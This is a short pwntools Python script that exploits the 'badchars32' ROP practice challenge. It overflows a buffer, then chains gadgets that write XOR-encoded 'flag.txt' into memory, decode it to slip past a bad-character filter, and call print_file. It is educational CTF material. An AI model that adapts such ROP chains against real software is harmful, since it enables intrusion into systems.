from pwn import *
elf = context.binary = ELF("./badchars32")
p = process()
offset = 44
wa_memory = 0x0804a020
mov_dword_ptr_edi_esi = 0x0804854f
pop_esi_edi_ebp = 0x080485b9
pop_ebp = 0x080485bb
pop_ebx = 0x0804839d
safe_junk_address = 0x804a040
xor_byte_ptr_ebp_bl = 0x08048547
ebx_xor = 2
print_file = 0xf7fbd000 + 0x7cf
part1 = xor(b"flag",ebx_xor)
part2 = xor(b".txt",ebx_xor)
log.info(f"Part1 ==> {part1}")
log.info(f"Part2 ==> {part2}")
rop = ROP(context.binary)
rop.raw(b"A" * offset)
rop.raw(pop_esi_edi_ebp)
rop.raw(part1)
rop.raw(wa_memory)
rop.raw(b"AAAA")
rop.raw(mov_dword_ptr_edi_esi)
rop.raw(pop_esi_edi_ebp)
rop.raw(part2)
rop.raw(wa_memory + 4)
rop.raw(b"AAAA")
rop.raw(mov_dword_ptr_edi_esi)
for i in range(8):
    rop.raw(pop_ebp)
    rop.raw(wa_memory + i)
    rop.raw(pop_ebx)
    rop.raw(2)
    rop.raw(xor_byte_ptr_ebp_bl)
rop.raw(print_file)
rop.raw(0)
rop.raw(wa_memory)
log.info(rop.dump())
p.sendline(rop.chain())
write("payload",rop.chain())
print(p.recvall())

